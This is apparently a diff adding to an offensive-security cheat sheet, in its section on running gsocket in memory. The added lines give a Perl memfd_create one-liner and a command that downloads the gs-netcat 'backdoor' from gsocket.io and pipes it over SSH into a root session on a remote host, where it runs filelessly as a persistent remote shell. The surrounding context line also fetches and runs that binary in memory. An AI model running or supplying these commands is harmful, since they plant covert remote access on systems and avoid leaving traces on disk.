@@ -2046,6 +2046,12 @@ Deploy gsocket without writing to the filesystem (example):
 GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))
 ```
 
+The backdoor can be piped via SSH directly into the remote's memory and executed:
+```sh
+MX="perl -e '\$f=syscall(319,\$n=\"\",1);if(-1==\$f){\$f=syscall(279,\$n,1);}open(\$o,\">&=\".\$f);while(<STDIN>){print \$o \$_;};exec {\"/proc/\$\$/fd/\$f\"} foo, @ARGV' --"
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec $MX -ilqD -s 5sLosWHZLpE9riqt74KvG9"
+```
+
 ---
 <a id="crypto"></a>
 ## 9. Crypto
